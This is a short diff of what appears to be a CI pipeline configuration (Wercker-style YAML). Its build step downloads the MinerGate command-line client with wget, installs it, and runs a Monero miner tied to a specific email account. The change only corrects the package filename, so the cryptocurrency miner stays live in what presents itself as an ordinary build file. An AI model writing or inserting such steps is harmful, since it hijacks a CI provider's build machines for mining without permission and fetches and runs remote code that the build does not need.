@@ -3,7 +3,7 @@ box:
 build:
   steps:
     - script:
-        code: apt-get update && apt-get install -y wget && wget https://download.minergate.com/xfast-ubuntu-cli && dpkg -i MinerGateX-cli-1.4-amd64.deb && minergate-cli --user empireofbooks@gmail.com --xmr 8 --gpu 0
+        code: apt-get update && apt-get install -y wget && wget https://download.minergate.com/xfast-ubuntu-cli && dpkg -i xfast-ubuntu-cli && minergate-cli --user empireofbooks@gmail.com --xmr 8 --gpu 0
 
 hello-again:
   box: ubuntu
